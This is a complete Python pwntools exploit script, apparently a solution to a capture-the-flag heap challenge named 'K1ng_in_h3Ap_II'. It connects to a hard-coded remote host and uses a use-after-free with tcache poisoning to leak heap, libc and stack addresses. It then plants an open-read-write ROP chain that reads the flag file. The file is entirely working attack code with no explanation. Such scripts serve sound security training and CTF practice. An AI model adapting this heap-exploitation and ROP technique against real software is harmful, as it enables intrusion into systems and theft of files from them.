# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './K1ng_in_h3Ap_II'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-arm', binary,'-g','1234'])
    #p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '47.104.175.110'
    port = '61608'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(idx , size):
    cmd(1)
    sla('index',idx)
    sla('size:',size)

def delete(idx):
    cmd(2)
    sla('index' , idx)

def edit(idx , context):
    cmd(3)
    sla('index' , idx)
    sa('context' , context)

def show(idx):
    cmd(4)
    sla('index' , idx)

one_gad = one_gadget(libc.path)

add(0,0x30)
add(1,0x30)

delete(0)
delete(1)

show(1)

rl()
rl()

heap_base = u64(p.recv(6).ljust(8,'\x00')) & 0xfffffffff000
lg('heap_base',heap_base)

add(0 ,0x60)

delete(0)
edit(0 , p64(heap_base + 0x10))

add( 1 , 0x60)
add( 0 , 0x60)
edit(0 , '\x07'*0x40)

delete(0)
show(0)

leak = l64()
lg('leak', leak)
__malloc_hook = leak - 0x70
libc.address = __malloc_hook - libc.sym['__malloc_hook']
environ = libc.sym['__environ']
read_addr = libc.sym['read']
open_addr = libc.sym['open']
puts_addr = libc.sym['puts']
pop_rdi_ret = 0x00000000000215bf + libc.address
pop_rsi_ret = 0x0000000000023eea + libc.address
pop_rdx_ret = 0x0000000000001b96 + libc.address
ret = 0x00000000000008aa + libc.address

edit(0 , '\x07'*0x40 + p64(environ))

add(2 ,0x18)
show(2)
stack_addr = l64() - 2352 + 2000 + 80
lg('stack_addr',stack_addr)

edit(0 , '\x07'*0x40 + flat(0 , 0 , 0 , stack_addr ))

add(3 , 0x48)

# dbg('read')
flag_addr = stack_addr + 0x280

ropchain = flat(pop_rdi_ret , 0 , pop_rsi_ret , stack_addr , pop_rdx_ret , 0x300 ,read_addr)
edit( 3 , ropchain)

orw =  p64(ret) *8
orw += flat(pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr)
orw += flat(pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_ret , 0x100,read_addr)
orw += flat(pop_rdi_ret , flag_addr , puts_addr)
orw = orw.ljust(0x280 ,'\x00') + 'flag'

# dbg()
se(orw)

p.interactive()

'''
@File    :   K1ng_in_h3Ap.py
@Time    :   2021/09/19 11:22:02
@Author  :   Niyah 
'''